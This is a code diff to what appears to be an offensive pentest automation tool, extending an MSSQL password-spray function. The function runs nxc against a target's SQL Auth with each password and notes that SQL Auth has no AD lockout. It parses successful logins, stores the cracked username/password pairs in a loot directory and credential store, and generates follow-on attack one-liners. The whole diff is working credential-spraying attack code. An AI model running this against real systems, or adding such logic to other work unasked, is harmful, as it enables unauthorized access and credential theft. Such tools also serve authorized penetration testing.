@@ -1,7 +1,7 @@
 from __future__ import annotations
 
 from .. import runner, ui
-from ..state import Findings
+from ..state import Findings, loot_dir
 
 
 async def discover_mssql(findings: Findings) -> bool:
@@ -71,24 +71,48 @@ async def mssql_authed(findings: Findings, user: str,
             findings.vulns.append("[HIGH] MSSQL account is sysadmin")
 
 
-async def mssql_spray(findings: Findings, users: list[str], passwords: list[str]) -> None:
+async def mssql_spray(findings: Findings, users: list[str], passwords: list[str]) -> list[tuple[str, str]]:
     if not runner.has("nxc") or not users or not passwords:
-        return
+        return []
     ui.section("mssql: password spray")
     ui.explain(
         "MSSQL has its own auth pool (no AD lockout for SQL Auth). "
         "Common targets: sa, sql_admin, sqlservice, dbo."
     )
+
+    domain_dir = loot_dir(findings.target.ip)
+    user_file = domain_dir / "_mssql_spray_users.txt"
+    user_file.write_text("\n".join(users) + "\n")
+
     found: list[tuple[str, str]] = []
     for password in passwords:
         cmd = [runner.resolve("nxc") or "nxc", "mssql", findings.target.ip,
-               "-u", users[0] if len(users) == 1 else "\n".join(users),
+               "-u", str(user_file),
                "-p", password, "--continue-on-success", "--local-auth"]
+        ui.cmd(cmd[:6] + ["[...]"])
         result = await runner.run(cmd, timeout=120)
         for line in result.stdout.splitlines():
-            if "[+]" in line and ":" in line:
-                ui.crit(f"MSSQL: {line.strip()[:160]}")
-    return None
+            if "[+]" not in line or ":" not in line:
+                continue
+            ui.crit(f"MSSQL: {line.strip()[:160]}")
+            parts = line.split()
+            for token in parts:
+                if "\\" in token or (":" in token and not token.startswith("MSSQL")):
+                    candidate = token.split("\\")[-1].split(":")[0].strip()
+                    if candidate and candidate in users and (candidate, password) not in found:
+                        found.append((candidate, password))
+                        from .. import creds_store, oneliner
+                        creds_store.add_password(findings, candidate, password)
+                        oneliner.emit_for_credential(findings, candidate, password=password)
+                    break
+
+    if found:
+        out = domain_dir / "mssql_spray_creds.txt"
+        out.write_text("\n".join(f"{u}:{p}" for u, p in found) + "\n")
+        ui.good(f"saved {len(found)} MSSQL cred(s) -> {out}")
+    else:
+        ui.explain("no valid MSSQL credentials found in spray.")
+    return found
 
 
 async def run_mssql(findings: Findings, *, user: str | None = None,
